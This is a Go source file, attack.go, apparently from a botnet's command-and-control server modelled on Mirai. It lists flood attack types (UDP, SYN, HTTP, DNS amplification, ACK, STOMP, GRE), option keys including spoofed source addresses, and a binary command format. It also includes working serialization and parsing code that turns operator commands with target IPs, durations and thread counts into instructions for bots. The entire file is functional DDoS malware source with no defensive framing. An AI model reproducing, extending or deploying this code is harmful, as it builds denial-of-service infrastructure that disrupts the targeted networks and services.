// attack.go — attack type registry and binary command serialization.
//
// The CNC serializes attack commands into a compact binary format
// that the bot deserializes with attack_parse(). Same pattern as
// Mirai's attack.c Build() / attack_parse() pair.

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
)

// --- attack vector enum ---

type AttackType uint8

const (
	ATK_UDP    AttackType = 0 // UDP flood — raw packet spam
	ATK_SYN    AttackType = 1 // TCP SYN flood — raw socket handshake spam
	ATK_HTTP   AttackType = 2 // HTTP flood — Layer 7, randomized headers
	ATK_DNS    AttackType = 3 // DNS amplification — reflection attack
	ATK_ACK    AttackType = 4 // TCP ACK flood — bypass stateless firewalls
	ATK_STOMP  AttackType = 5 // TCP STOMP — ACK+PSH aggressive teardown
	ATK_GRE_IP AttackType = 6 // GRE IP tunnel flood
)

var attackNames = map[string]AttackType{
	"udp":    ATK_UDP,
	"syn":    ATK_SYN,
	"http":   ATK_HTTP,
	"dns":    ATK_DNS,
	"ack":    ATK_ACK,
	"stomp":  ATK_STOMP,
	"greip":  ATK_GRE_IP,
}

func (a AttackType) String() string {
	for name, t := range attackNames {
		if t == a {
			return name
		}
	}
	return fmt.Sprintf("unknown(%d)", a)
}

// --- option key enum ---

type OptKey uint8

const (
	OPT_PKT_SIZE  OptKey = 0 // uint16 — packet size (bytes)
	OPT_SRC_PORT  OptKey = 1 // uint16 — source port
	OPT_HTTP_METH OptKey = 2 // string — GET / POST / HEAD
	OPT_HTTP_PATH OptKey = 3 // string — request path
	OPT_HTTP_HOST OptKey = 4 // string — Host header
	OPT_THREADS   OptKey = 5 // uint8  — worker thread count
	OPT_SPOOFED   OptKey = 6 // uint8  — 0=real src, 1=spoofed
)

// --- serialized attack command ---
//
// Wire format (big-endian):
//   [2 bytes] total_length    — includes these 2 bytes (max 4096)
//   [4 bytes] attack_id       — monotonically incrementing
//   [4 bytes] duration_secs   — how long to attack
//   [1 byte ] attack_type     — ATK_* enum value
//   [1 byte ] target_count    — number of targets
//   [N bytes] targets         — each: [4 bytes ipv4][2 bytes port]
//   [1 byte ] option_count    — number of options
//   [N bytes] options         — each: [1 byte key][1 byte val_len][N bytes val]
//     Total max: 4096 bytes (fits in one TCP segment comfortably).

const MaxAttackBuf = 4096

type AttackTarget struct {
	IP   net.IP
	Port uint16
}

type AttackOption struct {
	Key OptKey
	Val []byte
}

type AttackCommand struct {
	ID       uint32
	Duration uint32 // seconds
	Type     AttackType
	Targets  []AttackTarget
	Options  []AttackOption
}

// Serialize packs an AttackCommand into the binary wire format the bot expects.
func (a *AttackCommand) Serialize() ([]byte, error) {
	buf := make([]byte, MaxAttackBuf)
	offset := 2 // reserve for total_length

	// attack_id (4 bytes)
	binary.BigEndian.PutUint32(buf[offset:], a.ID)
	offset += 4

	// duration_secs (4 bytes)
	binary.BigEndian.PutUint32(buf[offset:], a.Duration)
	offset += 4

	// attack_type (1 byte)
	buf[offset] = byte(a.Type)
	offset++

	// target_count (1 byte)
	if len(a.Targets) > 255 {
		return nil, fmt.Errorf("max 255 targets, got %d", len(a.Targets))
	}
	buf[offset] = byte(len(a.Targets))
	offset++

	// targets
	for _, t := range a.Targets {
		ip4 := t.IP.To4()
		if ip4 == nil {
			return nil, fmt.Errorf("IPv4 required, got %v", t.IP)
		}
		copy(buf[offset:], ip4) // 4 bytes
		offset += 4
		binary.BigEndian.PutUint16(buf[offset:], t.Port)
		offset += 2
	}

	// option_count (1 byte)
	if len(a.Options) > 255 {
		return nil, fmt.Errorf("max 255 options, got %d", len(a.Options))
	}
	buf[offset] = byte(len(a.Options))
	offset++

	// options
	for _, o := range a.Options {
		buf[offset] = byte(o.Key)
		offset++
		if len(o.Val) > 255 {
			return nil, fmt.Errorf("option value too long: %d bytes", len(o.Val))
		}
		buf[offset] = byte(len(o.Val))
		offset++
		copy(buf[offset:], o.Val)
		offset += len(o.Val)
	}

	if offset > MaxAttackBuf {
		return nil, fmt.Errorf("serialized command too large: %d bytes", offset)
	}

	// Write total_length at the beginning.
	binary.BigEndian.PutUint16(buf[0:], uint16(offset))
	return buf[:offset], nil
}

// ParseAttackCommand parses a user's attack command string into an AttackCommand.
// Format: <type> <target>[:port] [duration=60] [key=val ...]
//
// Examples:
//
//	udp 192.168.1.1:80 duration=120 pkt_size=1024
//	syn 10.0.0.1:443 duration=300 threads=4 spoofed=1
//	http example.com:80 duration=60 method=GET path=/ host=example.com
func ParseAttackCommand(input string) (*AttackCommand, error) {
	parts := strings.Fields(input)
	if len(parts) < 2 {
		return nil, fmt.Errorf("usage: <type> <target>[:port] [duration=N] [key=val ...]")
	}

	// --- attack type ---
	atkType, ok := attackNames[strings.ToLower(parts[0])]
	if !ok {
		return nil, fmt.Errorf("unknown attack type '%s'. valid: udp, syn, http, dns, ack, stomp, greip", parts[0])
	}

	// --- target(s) ---
	// Comma-separated list of IP:port pairs.
	targetStrs := strings.Split(parts[1], ",")
	targets := make([]AttackTarget, 0, len(targetStrs))
	for _, ts := range targetStrs {
		host, portStr, err := net.SplitHostPort(ts)
		if err != nil {
			// No port specified — default to 80.
			host = ts
			portStr = "80"
		}

		// Resolve hostname to IP.
		ips, err := net.LookupIP(host)
		if err != nil {
			return nil, fmt.Errorf("cannot resolve %s: %v", host, err)
		}
		ip4 := ips[0].To4()
		if ip4 == nil {
			// Try next IP if first isn't IPv4.
			for _, ip := range ips {
				if ip4 = ip.To4(); ip4 != nil {
					break
				}
			}
		}
		if ip4 == nil {
			return nil, fmt.Errorf("no IPv4 address for %s", host)
		}

		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			return nil, fmt.Errorf("invalid port: %s", portStr)
		}

		targets = append(targets, AttackTarget{IP: ip4, Port: uint16(port)})
	}

	cmd := &AttackCommand{
		Type:     atkType,
		Targets:  targets,
		Duration: 60, // default: 60 seconds
		Options:  make([]AttackOption, 0),
	}

	// --- parse key=value flags ---
	for _, part := range parts[2:] {
		kv := strings.SplitN(part, "=", 2)
		if len(kv) != 2 {
			return nil, fmt.Errorf("invalid flag '%s' — use key=value format", part)
		}
		key, val := strings.ToLower(kv[0]), kv[1]

		switch key {
		case "duration":
			d, err := strconv.Atoi(val)
			if err != nil || d < 1 || d > 86400 {
				return nil, fmt.Errorf("duration must be 1–86400 seconds")
			}
			cmd.Duration = uint32(d)

		case "pkt_size":
			sz, err := strconv.Atoi(val)
			if err != nil || sz < 1 || sz > 65535 {
				return nil, fmt.Errorf("pkt_size must be 1–65535")
			}
			buf := make([]byte, 2)
			binary.BigEndian.PutUint16(buf, uint16(sz))
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_PKT_SIZE, Val: buf})

		case "src_port":
			sp, err := strconv.Atoi(val)
			if err != nil || sp < 1 || sp > 65535 {
				return nil, fmt.Errorf("src_port must be 1–65535")
			}
			buf := make([]byte, 2)
			binary.BigEndian.PutUint16(buf, uint16(sp))
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_SRC_PORT, Val: buf})

		case "method":
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_HTTP_METH, Val: []byte(strings.ToUpper(val))})

		case "path":
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_HTTP_PATH, Val: []byte(val)})

		case "host":
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_HTTP_HOST, Val: []byte(val)})

		case "threads":
			t, err := strconv.Atoi(val)
			if err != nil || t < 1 || t > 255 {
				return nil, fmt.Errorf("threads must be 1–255")
			}
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_THREADS, Val: []byte{byte(t)}})

		case "spoofed":
			s := uint8(0)
			if val == "1" || val == "true" || val == "yes" {
				s = 1
			}
			cmd.Options = append(cmd.Options, AttackOption{Key: OPT_SPOOFED, Val: []byte{s}})

		default:
			return nil, fmt.Errorf("unknown option '%s'", key)
		}
	}

	return cmd, nil
}
